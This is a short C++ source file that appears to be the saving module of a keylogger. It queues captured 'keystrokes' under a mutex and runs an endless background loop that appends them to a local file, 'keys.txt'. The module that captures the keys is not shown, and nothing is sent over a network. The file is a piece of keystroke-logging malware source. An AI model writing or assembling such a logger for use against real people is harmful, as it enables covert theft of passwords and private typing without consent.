#include "save.h"
#include <fstream>
#include <thread>
#include <chrono>
#include <queue>
#include <mutex>

std::queue<std::string> keystrokesQueue;
std::mutex keystrockesMutex;


void save(std::string text) {
    keystrockesMutex.lock();
    keystrokesQueue.push(text);
    keystrockesMutex.unlock();
}

void saveLoop() {
    while (true) {
        keystrockesMutex.lock();
        while (!keystrokesQueue.empty()) {
            std::ofstream myfile;
            myfile.open("keys.txt", std::ofstream::app);
            myfile << keystrokesQueue.front();
            keystrokesQueue.pop();
            myfile.close();
        }
        keystrockesMutex.unlock();
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}